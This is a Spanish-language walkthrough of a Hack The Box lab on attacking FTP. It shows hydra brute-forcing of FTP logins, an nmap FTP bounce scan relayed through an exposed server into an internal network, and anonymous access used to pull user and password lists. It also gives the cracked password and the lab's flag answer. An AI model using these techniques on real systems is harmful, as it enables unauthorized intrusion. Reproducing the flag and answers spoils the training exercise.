Puedo hacer fuerza bruta contra credenciales de un servidor FTP (sabiendo que el user es fiona), con:
```
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.203.7
```

---
### Ataques de rebote FTP
Un FTP Bounce Attack usa un servidor FTP expuesto como relé para que éste inicie conexiones hacia equipos internos (no accesibles desde Internet), permitiendo sondeos de puertos o exfiltración indirecta si el servidor FTP está mal configurado.

- El atacante se conecta al servidor FTP (FTP_DMZ) usando credenciales (públicas/anónimas o comprometidas).
- Mediante el comando `PORT` (o manipulando PASV) indica una dirección/puerto objetivo distinto al servidor FTP.
- El servidor FTP, si permite hacer conexiones de datos a direcciones arbitrarias, abre una conexión hacia el **Internal_DMZ** y actúa como proxy para el atacante.
- Resultado: el atacante puede escanear puertos o recibir datos desde la máquina interna sin acceder directamente a ella.

Flujo típico:
- Conexión al servidor FTP público (control channel).
- Autenticación (anonymous o credenciales válidas).
- Uso del comando PORT \<IP>,\<p1>,\<p2> para indicar a qué IP/puerto debe enviarse la conexión de datos.
- El servidor FTP abre la conexión de datos hacia la IP indicada.
- El atacante usa esa conexión para sondear puertos o transferir/recibir datos.
- Registrar/analizar respuestas para mapear servicios abiertos en la red interna.

```
# Escanea el puerto 80 en 172.17.0.2 utilizando el servidor FTP 10.10.110.213 como proxy
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

---
**Target: 10.129.203.6**
**1. What port is the FTP service running on?**
Ejecuto:
```
nmap -sCV --open --min-rate 2000 -vvv -Pn -n 10.129.203.6
```
Y obtengo como respuesta:
```
2121/tcp open  ftp         syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.203.6]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative

```

Siendo la respuesta del ejercicio: 2121

**2. What username is available for the FTP server?**
Ejecutando:
```
ftp 10.129.203.6 2121
```

Puedo entrar con el usuario "anonymous" (sin contraseña).
Hay una lista de usuarios que me descargo, y entre otros, se encuentra "robin". Pruebo dicha respuesta y es correcta.. Pero pienso que "anonymous" debería ser la respuesta.
Respuesta: robin

**3. Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.**
De la misma sesión de "anonymous", me descargo un archivo llamado "password.list" sobre la cual se incluye una lista de contraseñas posibles. 
Aplico fuerza bruta con:
```
hydra -l robin -P passwords.list ftp://10.129.203.6:2121
```

Dando como respuesta:
```
hydra -l robin -P passwords.list ftp://10.129.203.6:2121
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-15 02:45:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 250 login tries (l:1/p:250), ~16 tries per task
[DATA] attacking ftp://10.129.203.6:2121/
[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-15 02:46:31
```

Obteniendo la credencial: 7iz4rnckjsduza7

Me logeo en el servicio FTP con "robin:7iz4rnckjsduza7", y me descargo el archivo "flag.txt" (con get flag.txt) Siendo la respuesta al ejercicio:

Respuesta: HTB{ATT4CK1NG_F7P_53RV1C3}







